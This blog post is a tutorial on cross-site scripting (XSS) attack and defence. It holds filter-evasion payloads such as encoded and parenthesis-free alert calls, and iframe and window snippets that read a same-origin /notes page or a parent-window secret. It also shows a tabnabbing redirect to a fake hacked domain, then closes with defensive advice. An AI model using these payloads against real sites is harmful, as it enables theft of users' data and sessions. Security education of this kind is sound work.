---
layout: post
title: 'Cross-site scripting (XSS): Comprehensive guide on how to attack and defend'
tag:
- web-security
- infosec
- cross-site-scripting
- owasp
- cybersecurity
---

<p>This is a summary of XSS and everything needed to be able to find this vulnerability and protect yourself and others.</p><p>When starting out learning about XSS there is a lot of stuff, but most of it is just repeating, and you can’t find anything new. This guide should also cover the special cases that are hard to find on the web.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*e3krx4Mi1ka6IKXa4IQILg.png" /></figure><h3>Why my JavaScript is not executing?</h3><ul><li><em>Browser protection against JavaScript execution</em></li></ul><h4>1) SOP (<a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">Same-Origin Policy</a>)</h4><p>It is a security rule that keeps data safe by making sure that web pages from one website (origin) can’t access data from another website (origin) without permission.</p><p>Anytime when we want to read the response from an API or different website (origin), the website has to answer with a CORS header to allow reading, otherwise we will get a SOP error:</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*3h4HqCb9UVGAhhEncDix0A.png" /><figcaption>Fetch request from different origin</figcaption></figure><h4>2) CSP (<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">Content Security Policy</a>)</h4><p>A security feature that allows website owners to control what content (like scripts, images, or styles) can be loaded onto their web pages.</p><p>You can set your <a href="https://content-security-policy.com/">CSP</a> in html using meta tag (or using header Content-Security-Policy):</p><pre>&lt;meta<br>  http-equiv=&quot;Content-Security-Policy&quot;<br>  content=&quot;default-src &#39;self&#39;; img-src https://*; child-src &#39;none&#39;;&quot; /&gt;</pre><h4>3) CORS (<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS">Cross-Origin Resource Sharing</a>)</h4><p>Way for a website to request resources (like data) from another website even if they have different origins (domains).</p><p>It’s known under these headers:</p><pre>Access-Control-Allow-Origin: https://foo.example<br>Access-Control-Allow-Methods: POST, GET, OPTIONS<br>Access-Control-Allow-Headers: X-PINGOTHER, Content-Type<br>Access-Control-Max-Age: 86400</pre><p>It’s used to enable sharing of resources between different websites, but in a controlled way.</p><h4>4) Sanitized characters</h4><p>If a site properly sanitizes characters, the characters are rendered as HTML entities and the JavaScript or HTML tags are not executed.</p><ul><li>A double quote (“) as &amp;quot; or &amp;#34;</li><li>A single quote (‘) as &amp;apos; or &amp;#39;</li><li>An opening angle bracket (&lt;) as &amp;lt; or &amp;#60;</li><li>A closing angle bracket (&gt;) as &amp;gt; or &amp;#62;</li></ul><h3>Weird JavaScript</h3><ul><li><em>Encoding, function execution and much more is acting very weird when it comes to javascript</em></li></ul><h4>Encoding</h4><p>JavaScript supports various types of encoding, like Hex, Decimal, Unicode, named and HTML5 entities.</p><p>The weird thing about this, is that we can turn these encoding directly into chars or numbers without using a decoding function.</p><p>Also, it’s useful to know that a single character escape sequence exists:</p><pre>&#39;\b&#39; // backspace<br>&#39;\f&#39; // form feed<br>&#39;\n&#39; // new line<br>&#39;\r&#39; // carriage return<br>&#39;\t&#39; // tab<br>&#39;\v&#39; // vertical tab<br>&#39;\0&#39; // null<br>&#39;\&#39;&#39; // single quote<br>&#39;\&quot;&#39; // double quote<br>&#39;\\&#39; // backslash</pre><p>We can break down a word or sentence using this knowledge:</p><pre>&quot;A\W\E\S\O\M\E&quot; // &quot;AWESOME&quot;<br><br>&#39;Multiple \<br>lines&#39; // &quot;Multiple lines&quot;</pre><p><strong>Hex:</strong></p><p>We can encode using hex, but here is the problem that we can’t declare variables or call functions, because without a double quote it will cause an error.</p><pre>const a = () =&gt; 1;<br><br>&quot;\x61&quot; // returns &quot;a&quot;<br>\x61 // Invalid escape sequence</pre><p><strong>Unicode:</strong></p><p>We can declare functions and variables, we can also half encode word so that it won’t get filtred out.</p><pre>// unicode character &quot;63&quot; is allowed as a variable<br>const \u0061 = () =&gt; 1;<br>\u{63} = 1 <br><br>\u{61}() //correctly calls the function<br><br>&quot;H\u0065LLO&quot; // HELLO</pre><h4>Function Execution</h4><p>Functions may be quite fascinating in JavaScript, we can invoke them without parentheses:</p><pre>function printout(n1) {<br>  return n1;<br>};<br><br>printout(&quot;Hello World!&quot;); // output: &quot;Hello World&quot;<br>printout`Hello World!`; //  output: [&quot;Hello World&quot;]</pre><p>If we want to execute a function with more parameters, we can utilize <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals">template literals</a>. however, the indexing starts at 1 rather than 0.</p><pre>function sum(n1, n2) {<br>  console.log(n1, n2); // [&quot;n1&quot;, &quot;&quot;, &quot;&quot;], n2<br>  return Number(n1[0]) + n2;<br>}; <br><br>sum`5${4}`; // output: 9<br><br>// Easier way through arguments<br>function x() {<br>  console.log(arguments);<br>};<br><br>x`${1}${2}${3}`; // output [[&quot;&quot;, &quot;&quot;, &quot;&quot;], 1, 2, 3]</pre><p>There are more ways to execute a function. For example:</p><p>Interesting ways of executing alert found in book from <em>Gareth Heyes</em>:</p><pre>window.valueOf=alert;window+1<br>setTimeout`alert\x281337\x29`<br>&#39;1337,&#39;.replace`1337${alert}`<br>Reflect.apply.call`${alert}${window}${[1337]}`/</pre><p>And more from PayloadsAllTheThings:</p><pre>window[&#39;alert&#39;](0)<br>parent[&#39;alert&#39;](1)<br>self[&#39;alert&#39;](2)<br>top[&#39;alert&#39;](3)<br>this[&#39;alert&#39;](4)<br>frames[&#39;alert&#39;](5)<br><br>[7].map(alert);<br>[8].find(alert);<br>[9].every(alert);<br>[10].filter(alert);<br>[11].findIndex(alert);<br>[12].forEach(alert);</pre><h4><a href="https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/iframes-in-xss-and-csp">Iframe</a> and <a href="https://www.geeksforgeeks.org/window-object-in-javascript/">Window</a></h4><p>We can dereference window.alert and it will also dereference alert, because the origin of alert function lies on window.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/722/1*K9rUAMqiDLuQp4g__-_0zA.png" /><figcaption>Dereferencing alert object from window</figcaption></figure><p>Iframes can be used for JavaScript sandbox execution, suppose we got this code, and we want to execute a XSS to get the secret.</p><pre>var secret = &quot;MY-SECRET&quot;;<br>function createSandboxedEnvironment(code) {<br>    const iframe = document.createElement(&#39;iframe&#39;);<br>    iframe.style.display = &#39;none&#39;;<br>    document.body.appendChild(iframe);<br><br>    const sandboxWindow = iframe.contentWindow;<br>    const sandboxDocument = iframe.contentDocument;<br><br>    try {<br>        sandboxWindow.eval(code);<br>    } catch (error) {<br>        console.error(&#39;Error in sandboxed code:&#39;, error);<br>    } finally {<br>        document.body.removeChild(iframe);<br>    };<br>};<br><br>createSandboxedEnvironment(`console.log(&#39;Sandboxed:&#39;, secret);`); // undefined</pre><p>If we execute an XSS in the current scope, we will not receive any secrets or cookies. This means that it must be executed in the main window rather than the iframe window.</p><pre>createSandboxedEnvironment(<br>  `console.log(&#39;Sandboxed:&#39;, parent.secret);`<br>); // MY-SECRET<br><br>createSandboxedEnvironment(<br>  `console.log(&#39;Sandboxed:&#39;, window.top.secret);`<br>); // MY-SECRET<br><br>createSandboxedEnvironment(<br>  `console.log(&#39;Sandboxed:&#39;, window.parent.secret);`<br>); // MY-SECRET</pre><p>Another interesting aspect of the window object is that it allows you to launch a new tab and read from it if you are on the same origin. Assume we discovered XSS in a page and there is a /notes endpoint on the same origin. If we wish to read the /notes of another user, we may simply open a new window and read them.</p><pre>&lt;script&gt;<br>    window.open(&quot;http://localhost/notes.html&quot;, &quot;pwn&quot;);<br>    setTimeout(`console.log(window.open(&quot;&quot;, &quot;pwn&quot;).document.body.textContent)`, 1000);<br>&lt;/script&gt;</pre><p>But there is a catch that browsers usually block new windows. Still, we can get it through iframe .</p><pre>&lt;script&gt;<br>    const iframe = document.createElement(&#39;iframe&#39;);<br>    iframe.src = &quot;http://localhost/notes.html&quot;;<br>    iframe.style.display = &quot;none&quot;;<br>    document.body.appendChild(iframe);<br>    setTimeout(&quot;console.log(iframe.contentDocument.body.textContent)&quot;, 1000)<br>&lt;/script&gt;</pre><p>When we can’t access a window, the document.defaultView property is simply a way of obtaining the window object. For example, we can usually use a workaround that will allow us to access the “defaultView” property.</p><pre>let node = document.createElement(&#39;div&#39;);<br>node.ownerDocument.defaultView.alert(1337);</pre><h4>Payloads</h4><p>There are plenty of them, and I mean it. When it comes to XSS, we may get fairly creative, combining every mentioned aspect to overcome filters. The reason XSS is so dangerous is that it includes keyloggers, not to mention general user data and session hijacking.</p><p><strong><em>Most popular sources of XSS payloads:</em></strong></p><ul><li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection">PayloadsAllTheThings</a></li><li><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">Portswigger.net</a></li><li><a href="https://github.com/payloadbox/xss-payload-list/blob/master/Intruder/xss-payload-list.txt">Payloadbox</a></li></ul><h3>Weird browser</h3><h4>Document.getelementById()</h4><p>Did you know that you could get the element by id simply with a variable:</p><pre>&lt;a href=&quot;clobbered:1337&quot; id=x&gt;&lt;/a&gt;<br>&lt;script&gt;<br>  alert(x);//clobbered:1337<br>  alert(typeof x);//object<br>&lt;/script&gt;</pre><h4><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URLs">Data URLs</a></h4><p>data:,Hello%2C%20World%21</p><p>Data URLs are URLs that can render a webpage with scripts and tags in a browser; for example, we can use them to render a webpage directly in a <a href="https://ctftime.org/writeup/27125">redirect</a>.</p><h4><a href="https://www.jitbit.com/alexblog/256-targetblank---the-most-underestimated-vulnerability-ever/">Target property</a></h4><p>There was a time when element a with parameter _blank could access the original page, but this is no longer the case. However, if the parameter rel is set to opener, there may still be an issue.</p><pre>&lt;a href=&quot;http://localhost&quot; target=&quot;_blank&quot; rel=&quot;opener&quot;&gt;EXAMPLE&lt;/a&gt;</pre><p>The attacker can redirect the original webpage to his own destination or can just execute on the window JavaScript:</p><pre>if (window.opener) {<br>  window.opener.location = &#39;https://you-re-hacked.com&#39;;<br>};<br><br>if (window.opener) {<br>  window.opener.alert(&quot;YOUR COOKIES ARE MINE&quot;);<br>};</pre><h3>Defending</h3><h4>Snyk</h4><p>Automated security tool for scanning and monitoring your software development. It’s incredibly simple to set up and utilize. Sometimes snyk produces false positives, but it is still worthwhile to verify.</p><h4>Keep your libraries up-to-date</h4><p>Most vulnerabilities are not detected immediately, and people strive to address them as soon as possible when strange things occur. Keeping your libraries up-to-date is also important and sometimes painful.</p><h4>Javascript/Markdown sanitilization</h4><p>Sanitization is a good security practice to use when including or reflecting client-side HTML on your website. There are several open-source libraries. One example is: <a href="https://www.npmjs.com/package/sanitize-html">sanitize-html</a></p><h4>CSP (<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">Content Security Policy</a>)</h4><p>As mentioned, CSP can enhance your security by preventing cross-domain scripts from being loaded. However, it is not sufficient to include only CSP.</p><h3>Conclusion</h3><p>XSS is one of the most pervasive and dangerous vulnerabilities in web security, capable of compromising user data, hijacking sessions, and executing malicious code.</p><p>Theoretically, any user input might be utilized as an attack vector, potentially resulting in a vulnerability. You should pay special attention to these areas to ensure that they do not cause any strange behavior.</p><p>If you enjoyed this article, clap and follow me! Thanks for reading, and I wish you the best luck on your journey👋.</p><img src="https://medium.com/_/stat?event=post.clientViewed&referrerSource=full_rss&postId=5a5bfb2dbce2" width="1" height="1" alt="">
